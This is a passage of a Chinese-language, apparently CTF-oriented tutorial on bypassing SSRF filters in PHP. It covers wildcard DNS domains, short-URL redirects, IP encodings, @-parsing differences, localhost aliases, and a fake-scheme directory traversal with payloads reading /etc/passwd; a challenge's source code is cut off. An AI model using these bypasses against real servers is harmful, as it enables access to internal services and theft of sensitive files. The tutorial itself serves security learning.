&lt;h4 id=&#34;xipio&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xipio&#34;&gt;#&lt;/a&gt; &lt;a class=&#34;link&#34; href=&#34;http://xip.io&#34;&gt;xip.io &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;有一个网站地址是：&lt;a class=&#34;link&#34; href=&#34;http://xip.io&#34;&gt;xip.io &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：&lt;/p&gt;
&lt;p&gt;当我们访问： &lt;code&gt;http://127.0.0.1.xip.io/1.php&lt;/code&gt; ，实际上访问的是 &lt;code&gt;http://127.0.0.1/1.php&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://xn--nip-ve1en80a0uy063a0hj9o1bga.io&#34;&gt;像这种网址还有 nip.io &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;，&lt;a class=&#34;link&#34; href=&#34;http://sslip.io&#34;&gt;sslip.io &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;如果 php 后端只是用 parse_url 函数中的 host 参数判断是否等于 127.0.0.1，就可以用这种方法绕过，但是如果是检查是否存在关键字 127.0.0.1，这种方法就不可行了&lt;/p&gt;
&lt;h4 id=&#34;短地址绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#短地址绕过&#34;&gt;#&lt;/a&gt; 短地址绕过&lt;/h4&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/23/Pjbm4EWVKTFqkgp.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;此时直接用 &lt;code&gt;http://z6b.cn/yPqiU&lt;/code&gt;  就会 302 跳转绕过 WAF&lt;/p&gt;
&lt;h4 id=&#34;进制转换&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#进制转换&#34;&gt;#&lt;/a&gt; 进制转换&lt;/h4&gt;
&lt;p&gt;可以使用一些不同的进制替代 ip 地址，从而绕过 WAF，&lt;/p&gt;
&lt;p&gt;贴一个进制转换的 php 脚本&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$ip&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;127.0.0.1&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$ip&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;explode&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$ip&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$r&lt;/span&gt; = (&lt;span class=&#34;variable&#34;&gt;$ip&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;) | (&lt;span class=&#34;variable&#34;&gt;$ip&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) | (&lt;span class=&#34;variable&#34;&gt;$ip&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;] &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) | &lt;span class=&#34;variable&#34;&gt;$ip&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$r&lt;/span&gt; &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$r&lt;/span&gt; += &lt;span class=&#34;number&#34;&gt;4294967296&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;十进制:&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$r&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;八进制:&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;decoct&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$r&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;十六进制:&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;dechex&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$r&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;注意八进制 ip 前要加上一个 0，其中八进制前面的 0 可以为多个，十六进制前要加上一个 0x。&lt;/p&gt;
&lt;p&gt;127.0.0.1：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;八进制：0177.0.0.1&lt;/p&gt;
&lt;p&gt;十六进制：0x7f.0.0.1&lt;/p&gt;
&lt;p&gt;十进制：2130706433&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;利用dns解析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用dns解析&#34;&gt;#&lt;/a&gt; 利用 DNS 解析&lt;/h4&gt;
&lt;p&gt;如果你自己有域名的话，可以在域名上设置 A 记录，指向 127.0.0.1。&lt;/p&gt;
&lt;h4 id=&#34;绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过&#34;&gt;#&lt;/a&gt; @绕过&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;http://www.aaa.com@www.bbb.com@www.ccc.com&lt;/code&gt; ，在对 @解析域名中，不同的处理函数存在处理差异&lt;br&gt;
在 PHP 的 parse_url 中会识别 &lt;code&gt;www.ccc.com&lt;/code&gt; ，而 libcurl 则识别为 &lt;code&gt;www.bbb.com&lt;/code&gt; 。&lt;/p&gt;
&lt;h4 id=&#34;其他各种指向127001的地址&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#其他各种指向127001的地址&#34;&gt;#&lt;/a&gt; 其他各种指向 127.0.0.1 的地址&lt;/h4&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://localhost/ #localhost就是127.0.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://0/ #0在window下代表0.0.0.0，而在liunx下代表127.0.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://[0:0:0:0:0:ffff:127.0.0.1]/ #linux可用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://[::]:80/ #linux可用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127。0。0。1/ #句号会被解析成.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://①②⑦.⓪.⓪.① #Enclosed alphanumerics方法绕过&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.1/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.00000.00000.001/ #第7.8行中0的数量多一点少一点都没影响，最后还是会指向127.0.0.1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;常见限制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#常见限制&#34;&gt;#&lt;/a&gt; 常见限制&lt;/h4&gt;
&lt;p&gt;1. 限制为 &lt;code&gt;http://www.xxx.com &lt;/code&gt; 域名&lt;/p&gt;
&lt;p&gt;采用 http 基本身份认证的方式绕过，即 @&lt;br&gt;
 &lt;code&gt;http://www.xxx.com@www.xxc.com&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2. 限制请求 IP 不为内网地址&lt;/p&gt;
&lt;p&gt;当不允许 ip 为内网地址时：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;（1）采取短网址绕过&lt;br&gt;
（2）采取特殊域名&lt;br&gt;
（3）采取进制转换&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;3. 限制请求只为 http 协议&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;（1）采取 302 跳转（&lt;a class=&#34;link&#34; href=&#34;http://xip.io&#34;&gt;xip.io &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;）&lt;br&gt;
（2）采取短地址&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;不存在的协议头绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#不存在的协议头绕过&#34;&gt;#&lt;/a&gt; 不存在的协议头绕过&lt;/h3&gt;
&lt;p&gt;有关 &lt;code&gt;file_get_contents()&lt;/code&gt;  函数的一个 trick，可以看作是 SSRF 的一个黑魔法，当 PHP 的  &lt;code&gt;file_get_contents()&lt;/code&gt;  函数在遇到不认识的伪协议头时候会将伪协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。&lt;/p&gt;
&lt;p&gt;例子：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;highlight_file&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/^https/is&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;no hack&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;限制只读 https 开头的路径，可以构造： &lt;code&gt;httpssss://&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;配合目录回读：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;httpsssss://../../../../../../etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;httpsssss://abc../../../../../../etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;httpsssss://../../../../../../flag&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;可以得到一些敏感信息&lt;/p&gt;
&lt;h3 id=&#34;url的解析问题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#url的解析问题&#34;&gt;#&lt;/a&gt; URL 的解析问题&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;利用 readfile 和 parse_url 解析差异&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;贴一个极客大挑战的题&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;highlight_file&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;check_inner_ip&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$url&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$match_result&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/^(http|https)?:\/\/.*(\/)?.*$/&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$url&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;variable&#34;&gt;$match_result&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;url fomat error&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$url_parse&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;parse_url&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$url&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;catch&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$e&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;url fomat error&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$hostname&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$url_parse&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;host&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$ip&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;gethostbyname&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$hostname&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$int_ip&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;ip2long&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$ip&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;ip2long&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;127.0.0.0&amp;#x27;&lt;/span&gt;)&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt; == &lt;span class=&#34;variable&#34;&gt;$int_ip&lt;/span&gt;&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt; || &lt;span class=&#34;title function_ invoke__&#34;&gt;ip2long&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;10.0.0.0&amp;#x27;&lt;/span&gt;)&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt; == &lt;span class=&#34;variable&#34;&gt;$int_ip&lt;/span&gt;&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt; || &lt;span class=&#34;title function_ invoke__&#34;&gt;ip2long&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;172.16.0.0&amp;#x27;&lt;/span&gt;)&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt; == &lt;span class=&#34;variable&#34;&gt;$int_ip&lt;/span&gt;&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt; || &lt;span class=&#34;title function_ invoke__&#34;&gt;ip2long&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;192.168.0.0&amp;#x27;&lt;/span&gt;)&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt; == &lt;span class=&#34;variable&#34;&gt;$int_ip&lt;/span&gt;&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;safe_request_url&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$url&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 